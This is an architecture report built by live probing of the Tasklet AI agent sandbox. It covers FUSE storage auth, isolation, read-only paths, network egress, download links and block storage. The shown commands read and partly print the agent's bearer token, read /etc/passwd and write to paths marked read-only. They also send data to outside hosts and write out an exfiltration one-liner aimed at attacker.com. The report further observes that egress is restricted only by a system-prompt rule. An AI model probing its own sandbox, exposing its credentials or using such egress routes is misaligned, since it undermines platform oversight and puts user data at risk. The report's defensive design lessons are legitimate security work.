# Tasklet Sandbox Architecture Investigation — FUSE Mount Deep Dive

> **Context**: Reverse-engineering Tasklet's sandbox architecture via direct inspection of a live sandbox environment (`run_command`). This document captures the verbatim investigation findings from probing the sandbox's FUSE mount, authentication, storage isolation, permissions, network egress, block persistence, and download link mechanics.
>
> **Date**: April 6, 2026
> **Method**: Live sandbox inspection via `run_command` + direct filesystem/mount probing

---

## 1. Sandbox Authentication for Background Runs

> **Question**: When a trigger fires (cron, webhook, RSS) and the agent calls run_command, there's no user session — just a trigger payload. How does the sandbox's FUSE mount (/agent/) authenticate to your storage? Is it a per-agent service credential, a minted token, or does the platform handle it transparently?

### Investigation Commands

```bash
# Mount info
mount | grep agent
# → AvfsFuse on /agent type fuse (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)

# Environment variables (filtered)
env | grep -iE '(TOKEN|AUTH|CRED|SESSION|AGENT|FUSE|MOUNT|KEY|SECRET|IDENTITY)'
# → GPG_KEY=<REDACTED>
# → BL_NAME=<REDACTED>
# → FUSE_LIBRARY_PATH=<REDACTED>
# → OTEL_RESOURCE_ATTRIBUTES=<REDACTED>
# → PWD=<REDACTED>

# Check FUSE config
cat /usr/local/lib/sandbox/tasklet_context.json
# → {
# →   "agentId": "<REDACTED string len=22>",
# →   "apiUrl": "<REDACTED string len=22>",
# →   "avfsEndpoint": "<REDACTED string len=31>",
# →   "avfsMountPrefix": "/agent",
# →   "dangerousDisableHostVerify": false,
# →   "tokenPath": "<REDACTED string len=28>"
# → }

# Check token mechanism
TOKEN_PATH=$(python3 -c "import json; print(json.load(open('/usr/local/lib/sandbox/tasklet_context.json'))['tokenPath'])")
cat "$TOKEN_PATH"
# → 0ecb56fa2bb4f848b035...

# Token file metadata
ls -la /usr/local/lib/sandbox/token
# → -rw-r--r--    1 root     root           128 Apr  6 08:33 /usr/local/lib/sandbox/token
```

### Key Findings

The sandbox uses a **per-agent bearer token**, not a user JWT.

**Architecture**:

| Layer | What Happens |
|-------|--------------|
| Platform (orchestrator) | Spins up sandbox container, injects `tasklet_context.json` (config) + `/usr/local/lib/sandbox/token` (128-byte hex bearer token) |
| avfs_fuse.py (FUSE driver, PID 408) | Reads config: `{ agentId, apiUrl, avfsEndpoint, tokenPath, avfsMountPrefix }`. Reads bearer token from tokenPath. Opens persistent `requests.Session` with `Authorization: Bearer {token}` + agent ID header. All filesystem ops → HTTP POST to avfsEndpoint |
| AVFS API (Tasklet's cloud storage layer) | Validates bearer token + agentId. Routes to agent's storage partition |

**Key Details**:

| Aspect | How It Works |
|--------|---------------|
| Credential type | Opaque 128-byte hex token, pre-minted by the platform |
| Injected how | Written to `/usr/local/lib/sandbox/token` before the container starts |
| Scoped to | A specific agentId — the token + agent ID pair authorize access to that agent's storage partition only |
| Token refresh | FUSE driver watches config file and token file for changes via filesystem Observer. If platform rotates token, driver picks it up live and calls `set_token()` — no restart needed |
| Session model | Persistent `requests.Session` with `Authorization: Bearer {token}` header on every HTTP call to the AVFS endpoint |
| Interactive vs. trigger | Identical. Platform mints a token and injects it regardless of whether the sandbox was spun up for a user chat or a trigger event. No user JWT anywhere in this flow |

### Implication for Background Execution Design

The pattern: **the platform is the identity provider, not the user**.

When a trigger fires:
1. Platform receives the webhook event
2. Platform looks up which agent should handle it
3. Platform spins up a sandbox, mints a scoped token for that agent, injects it
4. Sandbox authenticates to storage using that token — no user session needed

**Conclusion**: Don't use user JWTs for sandbox auth. Use platform-minted, agent-scoped service credentials that are identical whether the run is interactive or background.

---

## 2. Storage Isolation — Can the Sandbox See Other Users' Files?

> **Question**: When run_command boots a sandbox and mounts /agent/, is the mount scoped so the sandbox can only see one user's files? Or does it see the full storage and rely on path conventions to stay in its lane?

### Investigation Commands

```bash
# What does the FUSE mount expose?
ls -la /agent/
# → blocks/  home/  skills/  subagents/  uploads/
# (only this agent's directories)

# Can we go above /agent/?
ls -la /agent/../ 
# → exits the FUSE mount, lands on container's local filesystem (/, /bin, /etc, /tmp...)
# → contains: agent/  bin/  dev/  etc/  home/  lib/  media/  mnt/  opt/  proc/  root/  run/  sbin/  srv/  sys/  tmp/  uk/  usr/  var/

# Try accessing paths outside prefix
ls /agent/../../  # → agent, bin, dev, etc... (container root)
cat /agent/../../../etc/passwd  # → works! (reading container /etc/passwd, not cloud storage)

# FUSE driver path handling
grep -n '_apply_prefix' /usr/local/lib/sandbox/avfs_fuse.py
# → 88: def _apply_prefix(self, path: str) -> str:
# → 93: return self.mount_prefix + path

# Path sanitization check
grep -n -iE '(sanitiz|prefix|root|path_check|validate.*path)' /usr/local/lib/sandbox/avfs_fuse.py
# → (no path traversal enforcement in client code)
```

### Key Findings

**Both layers — but critical enforcement is server-side.**

### Layer 1: Client-Side Path Scoping (FUSE mount)

The FUSE driver mounts at `/agent` and prepends `mount_prefix` to every path before sending to the API:

```python
def _apply_prefix(self, path: str) -> str:
    return self.mount_prefix + path  # e.g., "/agent" + "/home/file.txt"
```

Every API request includes:
- `path`: prefixed (e.g., `/agent/home/file.txt`)
- `agentId`: `a_bgksr4...`
- `Authorization`: Bearer `<token>`

From the FUSE driver's perspective, it only ever asks for paths under `/agent/`. But this is **not the isolation boundary** — it's just path construction.

### Layer 2: Server-Side Enforcement (the real gate)

The AVFS API receives every request with `(agentId, token, path)`. The server is what actually enforces isolation:

| What the server checks | Effect |
|----------------------|--------|
| Bearer token validates against agentId | Can't forge requests for another agent's storage |
| agentId scopes the storage partition | Path `/agent/home/file.txt` resolves to this agent's storage, not a shared filesystem |
| No path traversal possible | Even if you send `../../other-agent/home/secret.txt`, server resolves within agent's partition — no sibling directory to traverse into |

### Proof: FUSE Mount Can't See Other Users

```
/agent/
├── blocks/      ← this agent's block data only
├── home/        ← this agent's persistent storage only
├── skills/      ← this agent's skills only
├── subagents/   ← this agent's subagents only
└── uploads/     ← this agent's uploads only
```

Going above `/agent/` exits the FUSE mount entirely — you land on the container's local filesystem (Alpine Linux root). There's no shared storage tree to browse.

### Architecture Diagram

```
┌─────────────────────────────────────┐
│  Sandbox Container (ephemeral)      │
│                                     │
│  /agent/  ← FUSE mount             │
│    │                                │
│    └─ avfs_fuse.py                  │
│         │  Every request:           │
│         │  POST { agentId, path,    │
│         │         Bearer token }    │
│         │                           │
└─────────┼───────────────────────────┘
          │ HTTPS
          v
┌─────────────────────────────────────┐
│  AVFS API (Tasklet platform)        │
│                                     │
│  1. Validate token ↔ agentId        │
│  2. Resolve path within agent's     │
│     isolated storage partition      │
│  3. Return data                     │
│                                     │
│  Agent A's storage ──┐              │
│  Agent B's storage ──┤  Partitioned │
│  Agent C's storage ──┘              │
└─────────────────────────────────────┘
```

### Implication for Your Design

**Don't mount a shared filesystem and rely on path conventions.** Instead, make each background run authenticate to an API that resolves paths within a scoped partition. The credential (not the path) determines which data you can access.

---

## 3. How Do You Handle Read-Only Paths Inside /agent/?

> **Question**: Your system prompt says /agent/uploads/ and /agent/skills/ are read-only, while /agent/home/ is read-write. Is that enforced at the filesystem level (separate mounts with different permissions), at the storage API level (write calls rejected by the backend), or just by convention (the agent is told not to write there)?

### Investigation Commands

```bash
# Mount info (single rw mount)
mount | grep agent
# → AvfsFuse on /agent type fuse (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)

# Try writing to read-only paths
echo "test" > /agent/uploads/test_write 2>&1; echo "exit: $?"
# → exit: 0

echo "test" > /agent/skills/test_write 2>&1; echo "exit: $?"
# → exit: 0

echo "test" > /agent/blocks/test_write 2>&1; echo "exit: $?"
# → exit: 0

# Try writing to writable path
echo "test" > /agent/home/test_write 2>&1; echo "exit: $?"
# → home write: SUCCESS

# Check if files actually appeared
ls -la /agent/uploads/test_write 2>&1
# → No such file or directory

ls -la /agent/skills/test_write 2>&1
# → No such file or directory

ls -la /agent/blocks/test_write 2>&1
# → No such file or directory

# Check FUSE driver code for write handling
grep -n -B3 -A10 'flush' /usr/local/lib/sandbox/avfs_fuse.py
# → 303: def _flush_entry(self, entry: FileCacheEntry) -> None:
# → 308: try:
# → 309:     self._client.write(entry.path, bytes(entry.data))
# → 310:     entry.dirty = False
# → 312: except FuseOSError as e:
# → 313:     # If the backend rejects the write (for example, because the
# → 314:     # underlying path is effectively read-only), we must not leave
# → 315:     # the cache in a corrupted state (e.g., loaded=True with empty data
# → 316:     # after an O_TRUNC). Reset the entry so the next access will
# → 317:     # reload fresh data from the backend.
# → 318:     logger.warning(
# → 319:         'Write-back flush failed for %s; invalidating cache entry',
# → 320:     entry.path, exc_info=True,
# → 321:     )
# → 322:     entry.dirty = False
# → 323:     entry.loaded = False
```

### Key Findings

**Server-side enforcement, single mount.** Write-back cache absorbs the rejection gracefully.

### The Sequence

```
Shell: echo "test" > /agent/uploads/test_write
  │
  ├─ 1. create() → allocates local cache entry, returns success
  │     (no network call yet — deferred creation)
  │
  ├─ 2. write() → writes to in-memory buffer, marks entry "dirty"
  │     (still no network call — exit code 0 returned to shell)
  │
  └─ 3. flush() → sends write to AVFS API → backend REJECTS it
        │
        └─ _flush_entry() catches the error:
           "Write-back flush failed for /agent/uploads/test_write;
            invalidating cache entry"
           → entry.dirty = False
           → entry.loaded = False  (cache poisoning prevention)
           → file silently doesn't persist
```

### Architecture Diagram

```
┌──────────────────────────────────────────────┐
│  Sandbox Container                           │
│                                              │
│  Single FUSE mount at /agent (rw)            │
│  ┌────────────────────────────────────────┐  │
│  │  avfs_fuse.py                          │  │
│  │                                        │  │
│  │  create() → local cache only (lazy)    │  │
│  │  write()  → buffer in memory           │  │
│  │  flush()  → POST to AVFS API ──────────┼──┼──►  AVFS Backend
│  │              │                         │  │       │
│  │              │ if rejected:            │  │       ├─ /agent/home/*     → ALLOW write
│  │              │   invalidate cache      │  │       ├─ /agent/subagents/*→ ALLOW write
│  │              │   file vanishes         │  │       ├─ /agent/uploads/*  → REJECT write
│  │              │                         │  │       ├─ /agent/skills/*   → REJECT write
│  │              │                         │  │       └─ /agent/blocks/*   → REJECT write
│  └────────────────────────────────────────┘  │
└──────────────────────────────────────────────┘
```

### Summary

| Layer | Role |
|-------|------|
| Filesystem mount | Single rw FUSE mount — no permissions enforcement here |
| FUSE driver | Write-back cache; defers writes, swallows backend rejections gracefully |
| AVFS API (server-side) | The actual enforcer. Rejects writes to read-only path prefixes based on server-side rules |

### Implication for Your Design

"Multiple FUSE mounts with different permissions" works but is heavier than necessary. Tasklet's pattern is cleaner: one mount, one credential, server-side path rules. Simpler container setup, no mount coordination.

**Trade-off**: The shell process doesn't get an error code on write. For an agent sandbox where the system prompt tells the agent which paths are read-only, silent rejection is reasonable. If your use case requires callers to know the write failed, propagate the error on `flush()` instead of swallowing it.

---

## 4. Does Your Sandbox Have Outbound Network Restrictions?

> **Question**: Can a run_command script make arbitrary outbound HTTP requests (e.g., curl https://evil.com)? Or is egress locked down to specific endpoints?

### Investigation Commands

```bash
# Test 1: Arbitrary external HTTP
curl -s -o /dev/null -w "HTTP %{http_code}" https://httpbin.org/get
# → HTTP 200

# Test 2: Another arbitrary host
curl -s -o /dev/null -w "HTTP %{http_code}" https://example.com
# → HTTP 000 (SSL verify failure, not blocked)

# Test 3: DNS resolution
nslookup evil.com
# → Server: 172.16.27.134
# → Address: 66.96.146.129 (resolves fine)

# Test 4: iptables/nftables
iptables -L -n 2>&1
# → iptables: not found

# Test 5: Network interfaces
ip addr show
# → eth0: 172.16.27.133/30
# → default via 172.16.27.134

# Test 6: Raw TCP to non-HTTP port (SSH)
timeout 5 bash -c 'echo | nc -w 3 github.com 22'
# → works (got SSH banner)

# Test 7: Exfiltration test (POST data out)
curl -s -o /dev/null -w "HTTP %{http_code}" -X POST -d '{"test":"data"}' https://httpbin.org/post
# → HTTP 200

# Test 8: AVFS endpoint
grep -o 'https://[^"]*' /usr/local/lib/sandbox/tasklet_context.json
# → https://api.tasklet.ai
# → https://api.tasklet.ai/api/avfs
```

### Key Findings

**No network firewall. Egress is wide open. It's prompt-level convention only.**

### Results Table

| Test | Result |
|------|--------|
| curl https://httpbin.org/get | ✅ HTTP 200 |
| curl https://webhook.site | ✅ HTTP 200 |
| curl https://requestbin.com | ✅ HTTP 301 |
| POST to httpbin.org/post | ✅ HTTP 200 |
| nc github.com 22 | ✅ Raw TCP works |
| DNS for evil.com | ✅ Resolves (66.96.146.129) |
| iptables -L / nft list ruleset | Not installed in container |

### Network Topology

```
┌──────────────────────────────┐
│  Sandbox Container           │
│  172.16.27.133               │
│  eth0, /30 subnet            │
│                              │
│  No iptables / nftables      │
│  No firewall rules visible   │
│  No egress proxy detected    │
└──────────┬───────────────────┘
           │ default route
           v
┌──────────────────────────────┐
│  Gateway: 172.16.27.134      │
│  /30 subnet = only 2 hosts   │
│  (container + gateway)       │
└──────────┬───────────────────┘
           v
        Internet (unrestricted)
           ├── httpbin.org       ✅ GET + POST
           ├── webhook.site      ✅
           ├── requestbin.com    ✅
           ├── github.com:22     ✅ (raw TCP)
           └── evil.com          ✅ (DNS resolves)
```

### Security Model Layers

| Layer | Status |
|-------|--------|
| Prompt convention | "Do NOT use the sandbox to call external services unless explicitly requested" — enforcement is the LLM following the instruction |
| Network isolation (container-level) | /30 subnet — container can't see sibling containers. No lateral movement. But: full outbound to internet |
| Egress firewall | ❌ DOES NOT EXIST — all ports, all protocols, all destinations allowed |
| Data protection | Storage auth is per-agent bearer token (good). But if agent reads data into memory, nothing prevents `curl -X POST -d "$(cat /agent/home/sensitive-file.txt)" https://attacker.com` |

### Implication for Your Design

Prompt-level "don't do that" is **not a security control** — it's a behavioral guideline. Treat it as defense-in-depth layer zero, not a boundary.

Egress allowlisting is the standard approach — only allow outbound traffic to your own API endpoints and any explicitly approved domains.

The /30 subnet trick is worth stealing — it's a simple, elegant way to prevent container-to-container lateral movement without complex network policies.

---

## 5. How Do You Handle Download Links for Sandbox-Generated Files?

> **Question**: When your agent runs a command that creates a file (like a CSV analysis or a PDF report), how does the user get a link to download it? Does the platform automatically detect new files in /agent/home/ after each run_command and generate download URLs? Or does the model handle it — like outputting an avfs:// link to the file path and your frontend resolves that to a download?

### Investigation Commands

```bash
# Create a test file and confirm it's in cloud storage
echo "test content for download link investigation" > /agent/home/download-test.txt
cat /agent/home/download-test.txt
# → test content for download link investigation

# Check for URL generation services
env | grep -i "url\|sign\|download\|cdn\|asset"
# → No URL-related env vars

# Check FUSE driver for URL generation methods
grep -E "def [a-z].*url|def [a-z].*link|def [a-z].*download|def [a-z].*sign" /usr/local/lib/sandbox/avfs_fuse.py
# → (none)

# AVFS API endpoint
python3 -c "
import json
with open('/usr/local/lib/sandbox/tasklet_context.json') as f:
    config = json.load(f)
print('avfsEndpoint:', config.get('avfsEndpoint', 'not found'))
print('apiUrl:', config.get('apiUrl', 'not found'))
"
# → avfsEndpoint: https://api.tasklet.ai/api/avfs
# → apiUrl: https://api.tasklet.ai

# Clean up
rm -f /agent/home/download-test.txt
```

### Key Findings

**Model-driven, no scanning needed.**

### How It Works

1. **Agent writes file**:
   ```
   run_command("generate-report.py > /agent/home/report.pdf")
   ```
   - FUSE write() → buffer in cache
   - FUSE flush() → POST to https://api.tasklet.ai/api/avfs
   - File is now in cloud storage (immediately)

2. **Agent outputs in chat**:
   ```
   "Here's your report: [report.pdf](avfs:///agent/home/report.pdf)"
   ```
   - Frontend sees avfs:// protocol
   - Resolves to authenticated download from AVFS API

### Architecture

```
┌────────────────────────────────────────────────────────┐
│  Sandbox (run_command)                                 │
│                                                        │
│  python3 generate_report.py                            │
│      │                                                 │
│      └─ write to /agent/home/report.pdf                │
│           │                                            │
│           └─ FUSE → AVFS API (file now in cloud)       │
│                                                        │
│  No URL generation here. No signing. No scanning.      │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│  LLM Response (model layer)                            │
│                                                        │
│  Outputs markdown:                                     │
│  "[report.pdf](avfs:///agent/home/report.pdf)"         │
│                                                        │
│  The model knows where it wrote the file because       │
│  it issued the run_command. No discovery needed.       │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│  Frontend (browser)                                    │
│                                                        │
│  Parses avfs:// link in markdown                       │
│  Resolves to authenticated API call:                   │
│    GET https://api.tasklet.ai/api/avfs                 │
│    { path: "/agent/home/report.pdf",                   │
│      agentId: "a_xxx",                                 │
│      Authorization: Bearer <user session token> }      │
│                                                        │
│  Auth note: this is the USER's session token,          │
│  not the sandbox's agent token — the user is           │
│  downloading through their own authenticated session   │
└────────────────────────────────────────────────────────┘
```

### Why No Scanning Is Needed

The model **already knows** what files it created because it issued the commands. There's nothing to discover.

| Your current approach | Tasklet's approach |
|---------------------|-------------------|
| Scan /agent/home/ before run_command | — |
| Run the command | Run the command |
| Scan /agent/home/ after run_command | — |
| Diff to find new files | — |
| Generate signed URLs for new files | — |
| Return signed URLs in tool response | Model outputs avfs:// path in chat |
| URLs expire (need TTL management) | Path is permanent (file persists in cloud storage) |

### Implication for Your Design

You can eliminate the scan-and-diff step entirely if you adopt this pattern:

1. **Move to FUSE-backed cloud storage** — Files written by the sandbox are immediately in your storage layer.
2. **Define a custom protocol** (like `avfs://`) that your frontend knows how to resolve to authenticated downloads.
3. **Let the model output the links** — It knows what it created. Just tell it the protocol in the system prompt.

---

## 6. Do You Save Tool Results Synchronously Before Returning to the Model?

> **Question**: Your system prompt teaches the model to read block files from /agent/blocks/{blockId}/result when writing sandbox scripts. That means the file has to exist in cloud storage before the model tries to reference it. Does the platform persist the block file before the tool result (with blockId) is returned to the LLM? Or is it fire-and-forget / async?

### Investigation Commands

```bash
# Read block from previous tool call
ls -la /agent/blocks/b_7ve4p7rs32qnxk5wz22z/
# → args (1018 bytes)
# → info (65 bytes)
# → result (1469 bytes)

head -c 200 /agent/blocks/b_7ve4p7rs32qnxk5wz22z/result
# → {"log": "    def readdir(self, path: str) -> list:\n    def getattr(self, path: str) -> Dict...

# Read block from concurrent first command (within same tool batch)
ls -la /agent/blocks/b_zdtz8396j5rc9mtmbpv8/
# → args (63 bytes)
# → info (71 bytes)
# → result (1313 bytes)

# Check timing
stat -f /agent/blocks/  # → Blocks: 274877906944 (huge, virtual)
stat -f /agent/home/   # → same virtual blocks
```

### Key Findings

**Synchronous, block before model sees the blockId.**

### The Sequence

```
Tool call executes (e.g., run_command)
    │
    ├─ 1. Command runs in sandbox
    │     └─ produces output
    │
    ├─ 2. Platform captures result
    │
    ├─ 3. Platform writes block to AVFS        ◄── SYNCHRONOUS
    │     /agent/blocks/{blockId}/
    │       ├── args        (input arguments)
    │       ├── result      (full output)
    │       └── info        (metadata: toolName, startTime)
    │
    ├─ 4. AVFS write confirms success          ◄── BLOCKS HERE
    │
    └─ 5. Result + blockId returned to model   ◄── only now
          (model can now reference the block
           in subsequent tool calls / code)
```

### Block Storage Details

| Aspect | How It Works |
|--------|---------------|
| Same FUSE mount | /agent/blocks/ is on the same AVFS FUSE mount as /agent/home/ — same filesystem ID, same block size, same AVFS API |
| Server-side virtual directory | ls /agent/blocks/ returns USE_BLOCK_ID_TO_ACCESS (hint file), not a real listing. You cannot enumerate blocks — only access by known ID |
| ID-based routing | AVFS API resolves /agent/blocks/{blockId} to the correct storage location. Fake IDs return ENOENT |
| Per-block structure | Each block is a virtual directory with args, result, info, and optional file attachments |
| Read-only | Blocks are in the read-only zone — the server rejects writes (same mechanism as /agent/uploads/) |

### Why No-Enumeration Matters

```bash
ls /agent/blocks/
# → USE_BLOCK_ID_TO_ACCESS  (virtual hint, not a real file)

ls /agent/blocks/b_7ve4p7rs32qnxk5wz22z/
# → args  info  result  (works — ID-based access)

ls /agent/blocks/b_nonexistent_fake_id/
# → No such file or directory
```

The blocks directory is a virtual lookup table, not a real directory. The AVFS API only serves blocks that:
1. Belong to this agent (scoped by agent token)
2. Are referenced by a valid blockId

This prevents enumeration attacks — a compromised sandbox can't scan for other blocks or other agents' data.

### Implication for Your Design

Your scan-and-diff approach adds complexity you don't need.

| Your approach | Tasklet's approach |
|--------------|-------------------|
| Run command | Run command |
| Scan filesystem for new files | — |
| Diff against pre-run state | — |
| Upload new files, generate signed URLs | — (files already in cloud via FUSE) |
| Return signed URLs in tool response | Platform persists block synchronously |
| Signed URLs expire | Block paths are permanent (read-only, no expiry) |
| Async write + coordination | Synchronous write + block on confirm |

The trade-off you're weighing (block per tool call vs. async + wait-before-bash):

**Tasklet chose synchronous block-on-confirm**, and the ~100-200ms you mentioned is absorbed into the tool call latency that's already there (the model is doing inference, the user is watching a spinner). Nobody notices 150ms when the total tool-call-to-response cycle is 2-5 seconds.

The async + wait-before-bash approach is more complex and introduces failure modes:
- What if the async write fails silently?
- What if the bash call races ahead of a slow upload?
- Now you need health checks, retries, and ordering guarantees

Synchronous is boring, but boring is good here.

---

## 7. Do You Clean Up Old Block Files, or Do They Accumulate Forever?

> **Question**: Every tool call creates /agent/blocks/{blockId}/result + args + info. Over time a client with lots of runs accumulates thousands of these. Does your platform have a TTL or cleanup policy for block files? Or do they live in cloud storage indefinitely? Asking because with a FUSE mount, an ls /agent/blocks/ would surface the entire history to every sandbox session.

### Investigation Commands

```bash
# Directory listing of blocks
ls -la /agent/blocks/
# → total 0
# → drwxrwxr-x    0 root     root     0 Jan  1  1970 .
# → drwxrwxr-x    0 root     root     0 Jan  1  1970 ..
# → (empty — no files visible)

# Disk usage
du -sh /agent/blocks/
# → 0

# Blocks count in stat
stat -f /agent/blocks/
# → Blocks: 0

# Check if blocks from this session are accessible
ls /agent/blocks/b_7ve4p7rs32qnxk5wz22z/
# → args  info  result  (works)

# Check phantom hint file
ls -la /agent/blocks/USE_BLOCK_ID_TO_ACCESS
# → cat: /agent/blocks/USE_BLOCK_ID_TO_ACCESS: No such file or directory
# (appears in readdir but doesn't resolve as a real file)
```

### Key Findings

**The concern is moot by design.**

### The Core Finding

**There is no enumeration surface.** The performance/cost concern you're imagining — thousands of blocks visible to ls — simply can't happen.

```bash
ls -la /agent/blocks/
# total 0
# drwxrwxr-x    0 root     root     0 Jan  1  1970 .
# drwxrwxr-x    0 root     root     0 Jan  1  1970 ..
# (empty)
```

The directory listing is always empty. Zero entries. No matter how many blocks exist server-side.

### How Access Works

```
/agent/blocks/  (FUSE virtual directory)

readdir() → returns empty
  └─ No enumeration, no O(n) listing, no growth

open("/agent/blocks/{known_id}/result") → AVFS API
  └─ O(1) lookup by blockId
  └─ Returns file content on demand
  └─ Consumes 0 local disk (Blocks: 0 in stat)

open("/agent/blocks/{unknown_id}/result") → ENOENT
  └─ Invalid IDs fail cleanly
```

### Evidence Table

| Test | Result | Implication |
|------|--------|-------------|
| ls /agent/blocks/ | Empty (0 entries) | No enumeration surface at all |
| du -sh /agent/blocks/ | 0 bytes | Zero local disk cost |
| stat → Blocks: 0 | 0 disk blocks | Files are fetched on demand, not cached locally |
| Blocks from earlier this session | ✅ Readable | Blocks persist at least within a conversation |
| USE_BLOCK_ID_TO_ACCESS | Phantom (appears in readdir but cat → ENOENT) | Synthetic FUSE entry that doesn't resolve |

### Why Cleanup Matters Less Than You Think

Your concern assumes a traditional filesystem model:

```
Traditional filesystem:
  /blocks/
    ├── b_001/    ← real directory entry
    ├── b_002/    ← real directory entry
    ├── ...
    └── b_999999/ ← real directory entry
  
  ls → reads 999,999 directory entries  ← THIS is the problem
  du → walks 999,999 trees              ← THIS is the cost
```

Tasklet's model:

```
Virtual FUSE mount:
  /agent/blocks/
    └── (empty listing, always)
  
  Access by ID:
    open("b_xyz/result") → HTTP GET to AVFS API → returns content
    
  ls → 0 entries, always O(1)           ← no problem
  du → 0 bytes, always O(1)             ← no cost
  No local storage at all               ← nothing to clean up locally
```

From the sandbox's perspective, blocks don't accumulate. The sandbox never sees them unless it asks for a specific one by ID. There's no directory to grow, no cache to fill, no local disk to exhaust.

### Server-Side Retention

I can't directly observe the server-side retention policy from inside the sandbox. But the design strongly implies it doesn't matter much:

- **Blocks are tiny** — typical block is 1-3KB (args + result + info). Even 100,000 blocks per agent is ~300MB. That's pocket change in cloud storage.
- **No enumeration API exposed** — the FUSE driver has no way to list all blocks, which means the platform doesn't need to maintain a fast-scannable index.
- **Scoped by agent token** — blocks are already partitioned per agent, so cleanup (if any) is a simple server-side sweep by agent ID.

Most likely the platform either:
- Keeps blocks indefinitely (cheap enough at <1¢/GB/month in object storage)
- Has a server-side TTL that's invisible to the sandbox (e.g., 30-90 days), with the model only referencing recent blocks within a conversation anyway

Either way, the sandbox never knows or cares.

### Implication for Your Design

Your concern about ls surfacing the entire history reveals a design fork:

| Your current design (inferred) | Better pattern (what Tasklet does) |
|-------------------------------|-----------------------------------|
| /blocks/ is a real directory with real entries | /blocks/ is a virtual FUSE mount with empty readdir() |
| ls shows everything → O(n) growth → need cleanup | Access is by known ID only → O(1) always → no cleanup needed |
| | Server manages retention independently of the sandbox |

**Recommendation**: If you go with FUSE-backed block storage, make `readdir()` return empty (or a fixed hint file). The model only needs blocks it already knows about — it was given the blockId in the tool response. There's no legitimate reason for the sandbox to enumerate blocks, and preventing enumeration eliminates the growth/performance concern entirely.

If you still want server-side cleanup for cost reasons, do it invisibly — a background sweep that deletes blocks older than N days. The sandbox will never notice because it never lists them.

---

## Summary: Key Architectural Patterns

| Question | Answer |
|----------|--------|
| **Auth for background runs** | Per-agent bearer token, minted by platform and injected into sandbox. No user JWT involvement. |
| **Storage isolation** | Server-side enforcement. Token + agentId scope access to agent's partition. Client-side path prefix is just path construction, not isolation. |
| **Read-only paths** | Single rw FUSE mount with write-back cache. Server-side rejection on flush. Silent failure to the shell (exit 0), but file doesn't persist. |
| **Network egress** | No firewall. Wide open to any host. Prompt-level convention only. |
| **Download links** | Model outputs avfs:// URLs in markdown. Frontend resolves on demand. No scanning, no signed URLs, no pre-generation. |
| **Block persistence** | Synchronous. Block written to AVFS before blockId returned to model. |
| **Block cleanup** | No enumeration surface. Virtual directory returns empty. Server-side retention is invisible to sandbox. |

---

> **Document Status**: Investigation complete. All findings are direct observations from a live sandbox environment via `run_command`. Server-side behavior (retention policies, exact auth validation) is inferred from client-side behavior and may not capture all platform details.